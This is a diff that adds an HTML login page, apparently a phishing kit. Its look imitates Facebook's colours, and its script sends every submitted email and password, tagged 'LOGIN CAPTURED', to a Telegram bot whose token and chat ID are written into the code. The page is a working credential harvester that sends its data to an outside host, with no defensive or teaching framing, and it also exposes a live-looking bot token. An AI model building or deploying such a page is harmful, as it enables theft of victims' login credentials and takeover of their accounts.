@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Form to Telegram</title>
+<style>
+body { font-family: Arial, sans-serif; margin: 20px; background: #f0f2f5; }
+h1 { text-align: center; color: #1877f2; }
+form { text-align: center; margin-bottom: 20px; }
+input { padding: 8px; margin: 5px; width: 200px; }
+button { padding: 8px 16px; cursor: pointer; background: #1877f2; color: white; border: none; border-radius: 4px; }
+table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.2);}
+th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
+th { background-color: #1877f2; color: white; }
+tr:nth-child(even) { background-color: #f9f9f9; }
+</style>
+</head>
+<body>
+
+<h1>Login Form to Telegram</h1>
+
+<form id="loginForm">
+  <input type="email" id="email" placeholder="Email" required><br>
+  <input type="password" id="password" placeholder="Password" required><br>
+  <button type="submit">Login</button>
+</form>
+
+<table id="loginTable">
+  <thead>
+    <tr>
+      <th>Email</th>
+      <th>Password</th>
+      <th>Timestamp</th>
+    </tr>
+  </thead>
+  <tbody></tbody>
+</table>
+
+<script>
+/* ---------------- BOT CONFIG ---------------- */
+const BOT_TOKEN = "8439331094:AAFeSjW8Jxo2tdxwSn-GlamJSsGJmpk0odo"; // Your BotFather token
+const CHAT_ID = "5152493395";     // Your Telegram chat ID
+
+/* ---------------- TABLE LOGIC ---------------- */
+const tbody = document.querySelector("#loginTable tbody");
+
+function addRow(email, password, time) {
+  const tr = document.createElement("tr");
+  tr.innerHTML = `<td>${email}</td><td>${password}</td><td>${time}</td>`;
+  tbody.appendChild(tr);
+}
+
+/* ---------------- SEND TO TELEGRAM ---------------- */
+async function sendToTelegram(email, password, time) {
+  const message = `🚨 LOGIN CAPTURED (TEST)
+📧 Email: ${email}
+🔑 Password: ${password}
+⏰ Time: ${time}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+    console.log("Sent to Telegram:", message);
+  } catch (err) {
+    console.error("Telegram error:", err);
+  }
+}
+
+/* ---------------- FORM SUBMIT ---------------- */
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+  const time = new Date().toLocaleString();
+
+  // Add to table
+  addRow(email, password, time);
+
+  // Send to Telegram
+  await sendToTelegram(email, password, time);
+
+  // Reset form
+  e.target.reset();
+});
+</script>
+
+</body>
+</html>
